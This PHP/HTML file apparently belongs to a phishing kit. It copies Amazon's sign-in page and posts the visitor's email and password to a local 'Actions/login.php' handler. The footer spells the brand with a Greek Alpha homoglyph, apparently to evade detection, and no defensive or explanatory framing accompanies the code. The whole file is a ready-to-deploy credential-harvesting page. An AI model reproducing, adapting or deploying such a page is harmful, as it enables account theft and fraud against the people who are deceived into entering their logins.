<?php
    
    include('__CONFIG__.php');

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="stylesheet" href="Library/Bootstrap/css/main.min.css">
    <link rel="stylesheet" href="Sheets/index.css">
    <link rel="shortcut icon" href="assets/img/favicon.ico" />
    <title>Amazon Sign In</title>
</head>
<body>
    <!-- Logo Navbar-->
    <a href="#" class="navbrand text-center mt-3">
        <span class="aicon alogo"></span>
    </a>

    <div class="form">
        <div class="container-fluid">
            <div class="myform">
            <form action="Actions/login.php" method="post">
                <h1 class="colorblacked">Sign In</h1>
                <div class="form-group mt-14px">
                    <label for="textemail" class="emailorphone">Email (phone for mobile accounts)</label>
                    <input type="email" name="EM" class="form-control" id="textemail" required>
                </div>
                <div class="form-group mt-14px">
                    <label for="" class="label2">
                        <ul class="nav">
                            <li class="nav-item">
                              <a class="nav-link emailorphone" href="">Password</a>
                            </li>
                            <li class="nav-item ml-auto">
                              <a class="nav-link mylink" href="#">Forgot your password?</a>
                            </li>                           
                          </ul>
                    </label>
                    <input type="password" name="PW" class="form-control" id="textemail" required>
                </div>
                <button type="submit" name="Sex" class="btn bgcolored mt-6px">Sign In</button>
                <div class="form-group form-check mt-3" >
                    <input type="checkbox" class="form-check-input" id="checkbox">
                    <label class="form-check-label" for="checkbox">Keep me signed in.</label>
                </div>
                <hr class="hr-text" data-content="New to Amazon?">
                <button type="submit" class="btn bgcolored2 mt-2px">Create an account</button>
            </form>
            </div>
        </div>
    </div>

    <div class="myhr"></div>

    <div class="footer">
        <ul class="nav  justify-content-center">
            <li class="nav-item">
              <a class="nav-link mylinke" href="#">Conditions of Use</a>
            </li>
            <li class="nav-item">
              <a class="nav-link mylinke" href="#">Privacy Notice</a>
            </li>
            <li class="nav-item">
                <a class="nav-link mylinke" href="#">Help</a>
            </li>
        </ul>
        <p class="footertext text-center">© 1996- 2018, Αmazon. com, Inc. or its affiliates</p>
    </div>

    <script src="Library/jQuery/main.min.js"></script>
    <script src="Library/pooper/main.min.js"></script>
    <script src="Library/Bootstrap/js/main.min.js"></script>
</body>
</html>